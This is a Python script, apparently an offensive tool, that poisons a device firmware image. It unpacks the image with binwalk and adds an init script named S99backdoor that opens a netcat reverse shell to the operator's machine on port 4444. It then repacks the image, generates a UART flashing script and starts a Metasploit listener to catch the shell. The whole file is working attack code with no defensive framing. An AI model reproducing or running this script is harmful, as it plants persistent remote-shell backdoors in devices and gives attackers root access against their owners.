#!/usr/bin/env python3
import os
import socket
import subprocess
import shutil
import json
from datetime import datetime

FIRMWARE_PATH = "firmware/image.bin"
MOD_DIR = "firmware/mod"
REPORTS_DIR = "reports"
OUTPUT_IMAGE = "firmware/image_poisoned.bin"
FLASH_SCRIPT = "firmware/flash_uart.sh"
DASHBOARD_TRIGGER = "tasks/auto_override.json"

def ensure_dirs():
    for path in [MOD_DIR, REPORTS_DIR, "tasks"]:
        os.makedirs(path, exist_ok=True)

def check_dependencies():
    for tool in ["binwalk", "mksquashfs"]:
        if shutil.which(tool) is None:
            print(f"[!] Missing required tool: {tool}")
            exit(1)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def unpack_firmware():
    print("[*] Unpacking firmware...")
    subprocess.run(["binwalk", "-e", FIRMWARE_PATH], check=True)

def inject_payload(ip):
    print("[*] Injecting reverse shell payload...")
    init_script = os.path.join(MOD_DIR, "etc/init.d/S99backdoor")
    os.makedirs(os.path.dirname(init_script), exist_ok=True)
    payload = f"""#!/bin/sh
/bin/busybox nc {ip} 4444 -e /bin/sh &
"""
    with open(init_script, "w") as f:
        f.write(payload)
    os.chmod(init_script, 0o755)

def repack_firmware():
    print("[*] Repacking firmware...")
    subprocess.run(["mksquashfs", MOD_DIR, OUTPUT_IMAGE, "-all-root", "-noappend"], check=True)
    print(f"[+] Repacked image ready: {OUTPUT_IMAGE}")

def log_report():
    path = os.path.join(REPORTS_DIR, "firmware_poison_log.txt")
    with open(path, "a") as f:
        f.write(f"{datetime.now().isoformat()} - Payload injected into {OUTPUT_IMAGE}\n")
    print(f"[+] Log written: {path}")

def generate_uart_script():
    with open(FLASH_SCRIPT, "w") as f:
        f.write("#!/bin/bash\n")
        f.write("echo '[*] Flashing firmware to UART device...'\n")
        f.write(f"cat {OUTPUT_IMAGE} > /dev/ttyUSB0\n")
        f.write("echo '[+] Flash complete.'\n")
    os.chmod(FLASH_SCRIPT, 0o755)
    print(f"[+] UART flashing script generated: {FLASH_SCRIPT}")

def push_to_dashboard():
    data = {
        "task": "firmware_poison_flash",
        "firmware": OUTPUT_IMAGE,
        "status": "pending",
        "timestamp": datetime.now().isoformat()
    }
    with open(DASHBOARD_TRIGGER, "w") as f:
        json.dump(data, f, indent=2)
    print(f"[+] Dashboard trigger written: {DASHBOARD_TRIGGER}")

def launch_msf_listener(ip):
    print("[*] Launching Metasploit reverse shell listener...")
    listener = f"""
use exploit/multi/handler
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST {ip}
set LPORT 4444
exploit -j
"""
    with open("reports/msf_autolistener.rc", "w") as f:
        f.write(listener)
    subprocess.Popen(["msfconsole", "-r", "reports/msf_autolistener.rc"])

if __name__ == "__main__":
    ensure_dirs()
    check_dependencies()

    if not os.path.exists(FIRMWARE_PATH):
        print(f"[!] Firmware file not found at {FIRMWARE_PATH}")
        exit(1)

    ip = get_local_ip()
    print(f"[i] Detected local IP: {ip}")

    unpack_firmware()
    inject_payload(ip)
    repack_firmware()
    log_report()
    generate_uart_script()
    push_to_dashboard()
    launch_msf_listener(ip)

    print("[✓] Firmware poisoning complete and UART flash ready.")
